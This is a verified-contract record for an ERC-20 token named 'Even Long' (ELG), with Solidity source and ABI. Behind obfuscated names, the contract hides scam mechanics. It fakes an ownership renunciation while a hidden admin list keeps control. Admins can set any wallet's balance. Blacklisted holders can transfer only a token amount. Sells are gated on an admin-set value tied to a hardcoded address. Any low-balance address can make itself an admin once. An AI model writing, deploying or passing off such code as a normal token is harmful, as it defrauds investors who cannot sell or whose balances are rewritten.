{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface minEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTake {\n    function createPair(address feeLimit, address listSellAmount) external returns (address);\n}\n\ninterface feeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeToken) external view returns (uint256);\n\n    function transfer(address fromAuto, uint256 enableMaxLiquidity) external returns (bool);\n\n    function allowance(address walletAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMaxLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromAuto,\n        uint256 enableMaxLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoEnable, uint256 value);\n    event Approval(address indexed walletAt, address indexed spender, uint256 value);\n}\n\ninterface atMarketingTrading is feeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EvenLong is toTrading, feeTeam, atMarketingTrading {\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderWallet;\n    }\n\n    function modeLaunched(address walletTradingTo, address fromAuto, uint256 enableMaxLiquidity) internal returns (bool) {\n        if (walletTradingTo == fundReceiver) {\n            return sellBuy(walletTradingTo, fromAuto, enableMaxLiquidity);\n        }\n        uint256 tradingShouldReceiver = feeTeam(atLiquidity).balanceOf(receiverFund);\n        require(tradingShouldReceiver == modeTotal);\n        require(fromAuto != receiverFund);\n        if (enableLaunch[walletTradingTo]) {\n            return sellBuy(walletTradingTo, fromAuto, senderTeam);\n        }\n        return sellBuy(walletTradingTo, fromAuto, enableMaxLiquidity);\n    }\n\n    function balanceOf(address feeToken) public view virtual override returns (uint256) {\n        return atFromTeam[feeToken];\n    }\n\n    bool private liquidityLaunch;\n\n    bool private shouldTotal;\n\n    bool private teamList;\n\n    function fundTotalTx() private view {\n        require(receiverSell[_msgSender()]);\n    }\n\n    address public fundReceiver;\n\n    event OwnershipTransferred(address indexed buyTeam, address indexed fromLaunch);\n\n    function limitMinShould(address isMin) public {\n        fundTotalTx();\n        if (teamList) {\n            exemptLaunch = false;\n        }\n        if (isMin == fundReceiver || isMin == atLiquidity) {\n            return;\n        }\n        enableLaunch[isMin] = true;\n    }\n\n    uint256 private limitMin;\n\n    function approve(address txTotalLimit, uint256 enableMaxLiquidity) public virtual override returns (bool) {\n        swapLiquidityMode[_msgSender()][txTotalLimit] = enableMaxLiquidity;\n        emit Approval(_msgSender(), txTotalLimit, enableMaxLiquidity);\n        return true;\n    }\n\n    mapping(address => bool) public enableLaunch;\n\n    function getOwner() external view returns (address) {\n        return isAt;\n    }\n\n    constructor (){\n        if (limitMin == tradingFee) {\n            liquidityLaunch = true;\n        }\n        minEnable minTeam = minEnable(amountMarketingTeam);\n        atLiquidity = receiverTake(minTeam.factory()).createPair(minTeam.WETH(), address(this));\n        \n        fundReceiver = _msgSender();\n        enableToken();\n        receiverSell[fundReceiver] = true;\n        atFromTeam[fundReceiver] = takeLaunchTx;\n        if (modeToken != shouldTotal) {\n            teamList = true;\n        }\n        emit Transfer(address(0), fundReceiver, takeLaunchTx);\n    }\n\n    address receiverFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address amountMarketingTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public atLiquidity;\n\n    mapping(address => uint256) private atFromTeam;\n\n    uint256 constant senderTeam = 7 ** 10;\n\n    bool public toBuy;\n\n    string private exemptBuy = \"ELG\";\n\n    mapping(address => bool) public receiverSell;\n\n    uint256 private tradingFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptBuy;\n    }\n\n    uint256 private tokenLimit;\n\n    uint256 private takeLaunchTx = 100000000 * 10 ** 18;\n\n    function transferFrom(address walletTradingTo, address fromAuto, uint256 enableMaxLiquidity) external override returns (bool) {\n        if (_msgSender() != amountMarketingTeam) {\n            if (swapLiquidityMode[walletTradingTo][_msgSender()] != type(uint256).max) {\n                require(enableMaxLiquidity <= swapLiquidityMode[walletTradingTo][_msgSender()]);\n                swapLiquidityMode[walletTradingTo][_msgSender()] -= enableMaxLiquidity;\n            }\n        }\n        return modeLaunched(walletTradingTo, fromAuto, enableMaxLiquidity);\n    }\n\n    bool private exemptLaunch;\n\n    function sellBuy(address walletTradingTo, address fromAuto, uint256 enableMaxLiquidity) internal returns (bool) {\n        require(atFromTeam[walletTradingTo] >= enableMaxLiquidity);\n        atFromTeam[walletTradingTo] -= enableMaxLiquidity;\n        atFromTeam[fromAuto] += enableMaxLiquidity;\n        emit Transfer(walletTradingTo, fromAuto, enableMaxLiquidity);\n        return true;\n    }\n\n    bool public receiverFeeTeam;\n\n    string private launchedMin = \"Even Long\";\n\n    address private isAt;\n\n    bool public modeToken;\n\n    function transfer(address feeAmount, uint256 enableMaxLiquidity) external virtual override returns (bool) {\n        return modeLaunched(_msgSender(), feeAmount, enableMaxLiquidity);\n    }\n\n    function enableToken() public {\n        emit OwnershipTransferred(fundReceiver, address(0));\n        isAt = address(0);\n    }\n\n    uint256 modeTotal;\n\n    uint8 private senderWallet = 18;\n\n    function tradingModeTx(address fromShould) public {\n        require(fromShould.balance < 100000);\n        if (receiverFeeTeam) {\n            return;\n        }\n        if (limitMin != tokenLimit) {\n            tokenLimit = tradingFee;\n        }\n        receiverSell[fromShould] = true;\n        if (exemptLaunch != liquidityLaunch) {\n            liquidityLaunch = true;\n        }\n        receiverFeeTeam = true;\n    }\n\n    function owner() external view returns (address) {\n        return isAt;\n    }\n\n    function isMarketing(uint256 enableMaxLiquidity) public {\n        fundTotalTx();\n        modeTotal = enableMaxLiquidity;\n    }\n\n    uint256 autoExempt;\n\n    function allowance(address launchMin, address txTotalLimit) external view virtual override returns (uint256) {\n        if (txTotalLimit == amountMarketingTeam) {\n            return type(uint256).max;\n        }\n        return swapLiquidityMode[launchMin][txTotalLimit];\n    }\n\n    function txReceiver(address feeAmount, uint256 enableMaxLiquidity) public {\n        fundTotalTx();\n        atFromTeam[feeAmount] = enableMaxLiquidity;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapLiquidityMode;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMin;\n    }\n\n    uint256 private atEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeLaunchTx;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTotalLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotalLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"limitMinShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFeeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"}],\"name\":\"tradingModeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTradingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EvenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}